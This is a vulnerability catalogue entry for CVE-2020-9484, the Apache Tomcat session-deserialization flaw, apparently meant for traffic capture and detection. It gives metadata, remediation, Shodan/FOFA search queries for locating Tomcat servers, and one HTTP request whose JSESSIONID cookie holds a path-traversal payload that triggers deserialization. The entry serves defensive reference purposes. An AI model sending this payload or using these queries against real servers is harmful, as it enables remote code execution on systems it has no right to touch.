---
layout: post
cve_id: CVE-2020-9484
title: Apache Tomcat Remote Command Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-9484.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-9484.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: high
impact: 'Successful exploitation of this vulnerability can lead to remote code execution,
  allowing attackers to execute arbitrary commands on the affected system.

  '
remediation: 'Apply the latest security patches provided by Apache to mitigate this
  vulnerability.

  '
reference:
- http://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-9484
- https://lists.apache.org/thread.html/r77eae567ed829da9012cadb29af17f2df8fa23bf66faf88229857bb1%40%3Cannounce.tomcat.apache.org%3E
- https://lists.apache.org/thread.html/rf70f53af27e04869bdac18b1fc14a3ee529e59eb12292c8791a77926@%3Cusers.tomcat.apache.org%3E
- http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00057.html
classification:
  cvss-metrics: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7
  cve-id: CVE-2020-9484
  cwe-id: CWE-502
  epss-score: 0.93325
  epss-percentile: 0.99797
  cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: tomcat
  shodan-query:
  - title:"Apache Tomcat"
  - http.title:"apache tomcat"
  - http.html:"apache tomcat"
  - cpe:"cpe:2.3:a:apache:tomcat"
  fofa-query:
  - body="apache tomcat"
  - title="apache tomcat"
  google-query: intitle:"apache tomcat"
tags:
- cve2020
- cve
- rce
- packetstorm
- apache
- tomcat
- vuln
---

## üîç Vulnerability Description
When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if
a) an attacker is able to control the contents and name of a file on the server; and
b) the server is configured to use the PersistenceManager with a FileStore; and
c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and
d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control.
Note that all of conditions a) to d) must be true for the attack to succeed.


## üåê HTTP Request
```nohighlight
GET /index.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy
Accept-Encoding: gzip
```

